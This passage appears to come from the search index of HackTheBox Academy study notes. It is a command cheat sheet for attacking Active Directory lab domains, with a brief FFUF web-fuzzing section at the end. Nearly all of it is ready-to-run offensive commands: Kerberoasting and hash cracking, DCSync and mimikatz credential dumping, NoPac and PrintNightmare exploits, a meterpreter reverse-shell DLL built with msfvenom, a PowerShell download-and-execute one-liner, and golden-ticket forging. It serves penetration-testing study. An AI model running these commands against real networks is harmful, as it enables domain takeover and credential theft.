a Windows-based host. <code>impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/</code> Starts a impacket <code>SMB</code> server for quick hosting of a file. Performed from a Windows-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#kerberoasting","title":"Kerberoasting","text":"Command Description <code>sudo python3 -m pip install .</code> Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host. <code>GetUserSPNs.py -h</code> Impacket tool used to display the options and functionality of <code>GetUserSPNs.py</code> from a Linux-based host. <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday</code> Impacket tool used to get a list of <code>SPNs</code> on the target Windows domain from  a Linux-based host. <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request</code> Impacket tool used to download/request (<code>-request</code>) all TGS tickets for offline processing from a Linux-based host. <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev</code> Impacket tool used to download/request (<code>-request-user</code>) a TGS ticket for a specific user account (<code>sqldev</code>) from a Linux-based host. <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs</code> Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (<code>-outputfile sqldev_tgs</code>) linux-based host. <code>hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force</code> Attempts to crack the Kerberos (<code>-m 13100</code>) ticket hash (<code>sqldev_tgs</code>) using <code>hashcat</code> and a wordlist (<code>rockyou.txt</code>) from a Linux-based host. <code>setspn.exe -Q */*</code> Used to enumerate <code>SPNs</code> in a target Windows domain from a Windows-based host. <code>Add-Type -AssemblyName System.IdentityModel  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\"</code> PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host. <code>setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \\| Select-String '^CN' -Context 0,1 \\| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }</code> Used to download/request all TGS tickets from a WIndows-based host. <code>mimikatz # base64 /out:true</code> <code>Mimikatz</code> command that ensures TGS tickets are extracted in <code>base64</code> format from a Windows-based host. <code>kerberos::list /export</code> <code>Mimikatz</code> command used to extract the TGS tickets from a Windows-based host. <code>echo \"&lt;base64 blob&gt;\" \\|  tr -d \\\\n</code> Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host. <code>cat encoded_file \\| base64 -d &gt; sqldev.kirbi</code> Used to output a file (<code>encoded_file</code>) into a .kirbi file in base64 (<code>base64 -d &gt; sqldev.kirbi</code>) format from a Linux-based host. <code>python2.7 kirbi2john.py sqldev.kirbi</code> Used to extract the <code>Kerberos ticket</code>. This also creates a file called <code>crack_file</code> from a Linux-based host. <code>sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file &gt; sqldev_tgs_hashcat</code> Used to modify the <code>crack_file</code> for <code>Hashcat</code> from a Linux-based host. <code>cat sqldev_tgs_hashcat</code> Used to view the prepared hash from a Linux-based host. <code>hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt</code> Used to crack the prepared Kerberos ticket hash (<code>sqldev_tgs_hashcat</code>) using a wordlist (<code>rockyou.txt</code>) from a Linux-based host. <code>Import-Module .\\PowerView.ps1  Get-DomainUser * -spn \\| select samaccountname</code> Uses PowerView tool to extract <code>TGS Tickets</code> . Performed from a Windows-based host. <code>Get-DomainUser -Identity sqldev \\| Get-DomainSPNTicket -Format Hashcat</code> PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for <code>Hashcat</code> from a Windows-based host. <code>Get-DomainUser * -SPN \\| Get-DomainSPNTicket -Format Hashcat \\| Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation</code> Exports all TGS tickets to a <code>.CSV</code> file (<code>ilfreight_tgs.csv</code>) from a Windows-based host. <code>cat .\\ilfreight_tgs.csv</code> Used to view the contents of the .csv file from a Windows-based host. <code>.\\Rubeus.exe</code> Used to view the options and functionality possible with the tool <code>Rubeus</code>. Performed from a Windows-based host. <code>.\\Rubeus.exe kerberoast /stats</code> Used to check the kerberoast stats (<code>/stats</code>) within the target Windows domain from a Windows-based host. <code>.\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap</code> Used to request/download TGS tickets for accounts with the <code>admin</code> count set to <code>1</code> then formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>) . Performed from a Windows-based host. <code>.\\Rubeus.exe kerberoast /user:testspn /nowrap</code> Used to request/download a TGS ticket for a specific user (<code>/user:testspn</code>) the formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>). Performed from a Windows-based host. <code>Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes</code> PowerView tool used to check the <code>msDS-SupportedEncryptionType</code> attribute associated with a specific user account (<code>testspn</code>). Performed from a Windows-based host. <code>hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt</code> Used to attempt to crack the ticket hash using a wordlist (<code>rockyou.txt</code>) from a Linux-based host ."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#acl-enumeration-tactics","title":"ACL Enumeration &amp; Tactics","text":"Command Description <code>Find-InterestingDomainAcl</code> PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host. <code>Import-Module .\\PowerView.ps1  $sid = Convert-NameToSid wley</code> Used to import PowerView and retrieve the <code>SID</code> of a specific user account (<code>wley</code>) from a Windows-based host. <code>Get-DomainObjectACL -Identity * \\| ? {$_.SecurityIdentifier -eq $sid}</code> Used to find all Windows domain objects that the user has rights over by mapping the user's <code>SID</code> to the <code>SecurityIdentifier</code> property from a Windows-based host. <code>$guid= \"00299570-246d-11d0-a768-00aa006e0529\"   Get-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \\| Select Name,DisplayName,DistinguishedName,rightsGuid \\| ?{$_.rightsGuid -eq $guid} \\| fl</code> Used to perform a reverse search &amp; map to a <code>GUID</code> value from a Windows-based host. <code>Get-DomainObjectACL -ResolveGUIDs -Identity * \\| ? {$_.SecurityIdentifier -eq $sid}</code> Used to discover a domain object's ACL by performing a search based on GUID's (<code>-ResolveGUIDs</code>) from a Windows-based host. <code>Get-ADUser -Filter * \\| Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt</code> Used to discover a group of user accounts in a target Windows domain and add the output to a text file (<code>ad_users.txt</code>) from a Windows-based host. <code>foreach($line in [System.IO.File]::ReadLines(\"C:\\Users\\htb-student\\Desktop\\ad_users.txt\")) {get-acl  \"AD:\\$(Get-ADUser $line)\" \\| Select-Object Path -ExpandProperty Access \\| Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\\\wley'}}</code> A <code>foreach loop</code> used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(<code>ad_users.txt</code>) to the <code>Get-ADUser</code> cmdlet, then enumerates access rights of those users. Performed from a Windows-based host. <code>$SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE&gt;' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\wley', $SecPassword)</code> Used to create a <code>PSCredential Object</code> from a Windows-based host. <code>$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force</code> Used to create a <code>SecureString Object</code> from a Windows-based host. <code>Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose</code> PowerView tool used to change the password of a specifc user (<code>damundsen</code>) on a target Windows domain from a Windows-based host. <code>Get-ADGroup -Identity \"Help Desk Level 1\" -Properties * \\| Select -ExpandProperty Members</code> PowerView tool used view the members of a target security group (<code>Help Desk Level 1</code>) from a Windows-based host. <code>Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose</code> PowerView tool used to add a specifc user (<code>damundsen</code>) to a specific security group (<code>Help Desk Level 1</code>) in a target Windows domain from a Windows-based host. <code>Get-DomainGroupMember -Identity \"Help Desk Level 1\" \\| Select MemberName</code> PowerView tool used to view the members of a specific security group (<code>Help Desk Level 1</code>) and output only the username of each member (<code>Select MemberName</code>) of the group from a Windows-based host. <code>Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose</code> PowerView tool used create a fake <code>Service Principal Name</code> given a sepecift user (<code>adunn</code>) from a Windows-based host. <code>Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose</code> PowerView tool used to remove the fake <code>Service Principal Name</code> created during the attack from a Windows-based host. <code>Remove-DomainGroupMember -Identity \"Help Desk Level 1\" -Members 'damundsen' -Credential $Cred2 -Verbose</code> PowerView tool used to remove a specific user (<code>damundsent</code>) from a specific security group (<code>Help Desk Level 1</code>) from a Windows-based host. <code>ConvertFrom-SddlString</code> PowerShell cmd-let used to covert an <code>SDDL string</code> into a readable format. Performed from a Windows-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#dcsync","title":"DCSync","text":"Command Description <code>Get-DomainUser -Identity adunn  \\| select samaccountname,objectsid,memberof,useraccountcontrol \\|fl</code> PowerView tool used to view the group membership of a specific user (<code>adunn</code>) in a target Windows domain. Performed from a Windows-based host. <code>$sid= \"S-1-5-21-3842939050-3880317879-2865463114-1164\" Get-ObjectAcl \"DC=inlanefreight,DC=local\" -ResolveGUIDs \\| ? { ($_.ObjectAceType -match 'Replication-Get')} \\| ?{$_.SecurityIdentifier -match $sid} \\| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \\| fl</code> Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool <code>Get-ObjectAcl</code> to check a specific user's replication rights. Performed from a Windows-based host. <code>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss</code> Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (<code>172.16.5.5</code>) and save the extracted hashes to an file (<code>inlanefreight_hashes</code>). Performed from a Linux-based host. <code>mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\administrator</code> Uses <code>Mimikatz</code> to perform a <code>dcsync</code> attack from a Windows-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#privileged-access","title":"Privileged Access","text":"Command Description <code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Desktop Users\"</code> PowerView based tool to used to enumerate the <code>Remote Desktop Users</code> group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host. <code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Management Users\"</code> PowerView based tool to used to enumerate the <code>Remote Management Users</code> group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host. <code>$password = ConvertTo-SecureString \"Klmcargo2\" -AsPlainText -Force</code> Creates a variable (<code>$password</code>) set equal to the password (<code>Klmcargo2</code>) of a user from a Windows-based host. <code>$cred = new-object System.Management.Automation.PSCredential (\"INLANEFREIGHT\\forend\", $password)</code> Creates a variable (<code>$cred</code>) set equal to the username (<code>forend</code>) and password (<code>$password</code>) of a target domain account from a Windows-based host. <code>Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred</code> Uses the PowerShell cmd-let <code>Enter-PSSession</code> to establish a PowerShell session with a target over the network (<code>-ComputerName ACADEMY-EA-DB01</code>) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (<code>$cred</code> &amp; <code>$password</code>). <code>evil-winrm -i 10.129.201.234 -u forend</code> Used to establish a PowerShell session with a Windows target from a Linux-based host using <code>WinRM</code>. <code>Import-Module .\\PowerUpSQL.ps1</code> Used to import the <code>PowerUpSQL</code> tool. <code>Get-SQLInstanceDomain</code> PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host. <code>Get-SQLQuery -Verbose -Instance \"172.16.5.150,1433\" -username \"inlanefreight\\damundsen\" -password \"SQL1234!\" -query 'Select @@version'</code> PowerUpSQL tool used to connect to connect to a SQL server and query the version (<code>-query 'Select @@version'</code>) from a Windows-based host. <code>mssqlclient.py</code> Impacket tool used to display the functionality and options provided with <code>mssqlclient.py</code> from a Linux-based host. <code>mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</code> Impacket tool used to connect to a MSSQL server from a Linux-based host. <code>SQL&gt; help</code> Used to display mssqlclient.py options once connected to a MSSQL server. <code>SQL&gt; enable_xp_cmdshell</code> Used to enable <code>xp_cmdshell stored procedure</code> that allows for executing OS commands via the database from a Linux-based host. <code>xp_cmdshell whoami /priv</code> Used to enumerate rights on a system using <code>xp_cmdshell</code>."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#nopac","title":"NoPac","text":"Command Description <code>sudo git clone https://github.com/Ridter/noPac.git</code> Used to clone a <code>noPac</code> exploit using git. Performed from a Linux-based host. <code>sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</code> Runs <code>scanner.py</code> to check if a target system is vulnerable to <code>noPac</code>/<code>Sam_The_Admin</code> from a Linux-based host. <code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</code> Used to exploit the <code>noPac</code>/<code>Sam_The_Admin</code>  vulnerability and gain a SYSTEM shell (<code>-shell</code>). Performed from a Linux-based host. <code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</code> Used to exploit the <code>noPac</code>/<code>Sam_The_Admin</code>  vulnerability and perform a <code>DCSync</code> attack against the built-in Administrator account on a Domain Controller from a Linux-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#printnightmare","title":"PrintNightmare","text":"Command Description <code>git clone https://github.com/cube0x0/CVE-2021-1675.git</code> Used to clone a PrintNightmare exploit  using git from a Linux-based host. <code>pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install</code> Used to ensure the exploit author's (<code>cube0x0</code>) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host. <code>rpcdump.py @172.16.5.5 \\| egrep 'MS-RPRN\\|MS-PAR'</code> Used to check if a Windows target has <code>MS-PAR</code> &amp; <code>MSRPRN</code> exposed from a Linux-based host. <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll &gt; backupscript.dll</code> Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host. <code>sudo smbserver.py -smb2support CompData /path/to/backupscript.dll</code> Used to create an SMB server and host a shared folder (<code>CompData</code>) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host. <code>sudo python3 CVE-2021-1675.py inlanefreight.local/&lt;username&gt;:&lt;password&gt;@172.16.5.5 '\\\\10.129.202.111\\CompData\\backupscript.dll'</code> Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#petitpotam","title":"PetitPotam","text":"Command Description <code>sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</code> Impacket tool used to create an <code>NTLM relay</code> by specifiying the web enrollment URL for the <code>Certificate Authority</code> host. Perfomred from a Linux-based host. <code>git clone https://github.com/topotam/PetitPotam.git</code> Used to clone the <code>PetitPotam</code> exploit using git. Performed from a Linux-based host. <code>python3 PetitPotam.py 172.16.5.225 172.16.5.5</code> Used to execute the PetitPotam exploit by  specifying the IP address of the attack host (<code>172.16.5.255</code>) and the target Domain Controller (<code>172.16.5.5</code>). Performed from a Linux-based host. <code>python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\\$ -pfx-base64 &lt;base64 certificate&gt; = dc01.ccache</code> Uses <code>gettgtpkinit</code>.py to request a TGT ticket for the Domain Controller (<code>dc01.ccache</code>) from a Linux-based host. <code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass \"ACADEMY-EA-DC01$\"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code> Impacket tool used to perform a DCSync attack and retrieve one or all of the <code>NTLM password hashes</code> from the target Windows domain. Performed from a Linux-based host. <code>klist</code> <code>krb5-user</code> command used to view the contents of the <code>ccache</code> file. Performed from a Linux-based host. <code>python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$</code> Used to submit TGS requests using <code>getnthash.py</code> from a Linux-based host. <code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator \"ACADEMY-EA-DC01$\"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba</code> Impacket tool used to extract hashes from <code>NTDS.dit</code> using a <code>DCSync attack</code> and a captured hash (<code>-hashes</code>). Performed from a Linux-based host. <code>.\\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /&lt;base64 certificate&gt;=/ptt</code> Uses Rubeus to request a TGT and perform a <code>pass-the-ticket attack</code> using the machine account (<code>/user:ACADEMY-EA-DC01$</code>) of a Windows target. Performed from a Windows-based host. <code>mimikatz # lsadump::dcsync /user:inlanefreight\\krbtgt</code> Performs a DCSync attack using <code>Mimikatz</code>. Performed from a Windows-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#miscellaneous-misconfigurations","title":"Miscellaneous Misconfigurations","text":"Command Description <code>Import-Module .\\SecurityAssessment.ps1</code> Used to import the module <code>Security Assessment.ps1</code>. Performed from a Windows-based host. <code>Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code> SecurityAssessment.ps1 based tool used to enumerate a Windows target for <code>MS-PRN Printer bug</code>. Performed from a Windows-based host. <code>adidnsdump -u inlanefreight\\\\forend ldap://172.16.5.5</code> Used to resolve all records in a DNS zone over <code>LDAP</code> from a Linux-based host. <code>adidnsdump -u inlanefreight\\\\forend ldap://172.16.5.5 -r</code> Used to resolve unknown records in a DNS zone by performing an <code>A query</code> (<code>-r</code>) from a Linux-based host. <code>Get-DomainUser * \\| Select-Object samaccountname,description</code> PowerView tool used to display the description field of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host. <code>Get-DomainUser -UACFilter PASSWD_NOTREQD \\| Select-Object samaccountname,useraccountcontrol</code> PowerView tool used to check for the <code>PASSWD_NOTREQD</code> setting of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host. <code>ls \\\\academy-ea-dc01\\SYSVOL\\INLANEFREIGHT.LOCAL\\scripts</code> Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#group-policy-enumeration-attacks","title":"Group Policy Enumeration &amp; Attacks","text":"Command Description <code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE</code> Tool used to decrypt a captured <code>group policy preference password</code> from a Linux-based host. <code>crackmapexec smb -L \\| grep gpp</code> Locates and retrieves a <code>group policy preference password</code> using <code>CrackMapExec</code>, the filters the output using <code>grep</code>. Peformed from a Linux-based host. <code>crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</code> Locates and retrieves any credentials stored in the <code>SYSVOL</code> share of a Windows target using <code>CrackMapExec</code> from a Linux-based host. <code>Get-DomainGPO \\| select displayname</code> PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host. <code>Get-GPO -All \\| Select DisplayName</code> PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host. <code>$sid=Convert-NameToSid \"Domain Users\"</code> Creates a variable called <code>$sid</code> that is set equal to the <code>Convert-NameToSid</code> tool and specifies the group account <code>Domain Users</code>. Performed from a Windows-based host. <code>Get-DomainGPO \\| Get-ObjectAcl \\| ?{$_.SecurityIdentifier -eq $sid</code> PowerView tool that is used to check if the <code>Domain Users</code>  (<code>eq $sid</code>) group has any rights over one or more GPOs. Performed from a Windows-based host. <code>Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532</code> PowerShell cmd-let used to display the name of a GPO given a <code>GUID</code>. Performed from a Windows-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#asreproasting","title":"ASREPRoasting","text":"Command Description <code>Get-DomainUser -PreauthNotRequired \\| select samaccountname,userprincipalname,useraccountcontrol \\| fl</code> PowerView based tool used to search for the <code>DONT_REQ_PREAUTH</code> value across in user accounts in a target Windows domain. Performed from a Windows-based host. <code>.\\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</code> Uses <code>Rubeus</code> to perform an <code>ASEP Roasting attack</code> and formats the output for <code>Hashcat</code>. Performed from a Windows-based host. <code>hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt</code> Uses <code>Hashcat</code> to attempt to crack the captured hash using a wordlist (<code>rockyou.txt</code>). Performed from a Linux-based host. <code>kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt</code> Enumerates users in a target Windows domain and automatically retrieves the <code>AS</code> for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#trust-relationships-child-parent-trusts","title":"Trust Relationships - Child &gt; Parent Trusts","text":"Command Description <code>Import-Module activedirectory</code> Used to import the <code>Active Directory</code> module. Performed from a Windows-based host. <code>Get-ADTrust -Filter *</code> PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. <code>Get-DomainTrust</code> PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. <code>Get-DomainTrustMapping</code> PowerView tool used to perform a domain trust mapping from a Windows-based host. <code>Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL \\| select SamAccountName</code> PowerView tools used to enumerate users in a target child domain from a Windows-based host. <code>mimikatz # lsadump::dcsync /user:LOGISTICS\\krbtgt</code> Uses Mimikatz to obtain the <code>KRBTGT</code> account's <code>NT Hash</code> from a Windows-based host. <code>Get-DomainSID</code> PowerView tool used to get the SID for a target child domain from a Windows-based host. <code>Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity \"Enterprise Admins\" \\| select distinguishedname,objectsid</code> PowerView tool used to obtain the <code>Enterprise Admins</code> group's SID from a Windows-based host. <code>ls \\\\academy-ea-dc01.inlanefreight.local\\c$</code> Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host. <code>mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</code> Uses <code>Mimikatz</code> to create a <code>Golden Ticket</code> from a Windows-based host . <code>.\\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt</code> Uses <code>Rubeus</code> to create a <code>Golden Ticket</code> from a Windows-based host. <code>mimikatz # lsadump::dcsync /user:INLANEFREIGHT\\lab_adm</code> Uses <code>Mimikatz</code> to perform a DCSync attack from a Windows-based host. <code>secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</code> Impacket tool used to perform a DCSync attack from a Linux-based host. <code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240</code> Impacket tool used to perform a <code>SID Brute forcing</code> attack from a Linux-based host. <code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \\| grep \"Domain SID\"</code> Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host. <code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 \\| grep -B12 \"Enterprise Admins\"</code> Impacket tool used to retrieve the <code>SID</code> of a target Windows domain and attach it to the Enterprise Admin group's <code>RID</code> from a Linux-based host. <code>ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker</code> Impacket tool used to create a <code>Golden Ticket</code> from a Linux-based host. <code>export KRB5CCNAME=hacker.ccache</code> Used to set the <code>KRB5CCNAME Environment Variable</code> from a Linux-based host. <code>psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5</code> Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host. <code>raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</code> Impacket tool that automatically performs an attack that escalates from child to parent domain."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#trust-relationships-cross-forest","title":"Trust Relationships - Cross-Forest","text":"Command Description <code>Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \\| select SamAccountName</code> PowerView tool used to enumerate accounts for associated <code>SPNs</code> from a Windows-based host. <code>Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \\| select samaccountname,memberof</code> PowerView tool used to enumerate the <code>mssqlsvc</code> account from a Windows-based host. <code>.\\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</code> Uses <code>Rubeus</code> to perform a Kerberoasting Attack against a target Windows domain (<code>/domain:FREIGHTLOGISTICS.local</code>) from a Windows-based host. <code>Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL</code> PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host. <code>Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\\administrator</code> PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host. <code>GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley</code> Impacket tool used to request (<code>-request</code>) the TGS ticket of an account in a target Windows domain (<code>-target-domain</code>) from a Linux-based host. <code>bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2</code> Runs the Python implementation of <code>BloodHound</code> against a target Windows domain from a Linux-based host. <code>zip -r ilfreight_bh.zip *.json</code> Used to compress multiple files into 1 single <code>.zip</code> file to be uploaded into the BloodHound GUI."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#harnessing-powershell","title":"Harnessing PowerShell","text":"Command Description <code>Get-Module</code> Lists available modules loaded for use. <code>Get-ExecutionPolicy -List</code> Will print the execution policy settings for each scope on a host. <code>Set-ExecutionPolicy Bypass -Scope Process</code> This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. <code>Get-Content C:\\Users\\&lt;USERNAME&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt</code> With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. <code>powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); &lt;follow-on commands&gt;\"</code> This is a quick and easy way to download a file from the web using PowerShell and call it from memory. <code>Get-ChildItem Env: \\| ft Key,Value</code> Return environment values such as key paths, users, computer information, etc."},{"location":"HackTheBox%20Materials/Attacking%20Web%20Applications%20with%20FFUF/","title":"Attacking Web Applications with FFUF","text":"Command Description <code>ffuf -h</code> ffuf help <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</code> Directory Fuzzing <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ</code> Extension Fuzzing <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php</code> Page Fuzzing <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</code> Recursive Fuzzing <code>ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/</code> Sub-domain Fuzzing <code>ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx</code> VHost Fuzzing <code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx</code> 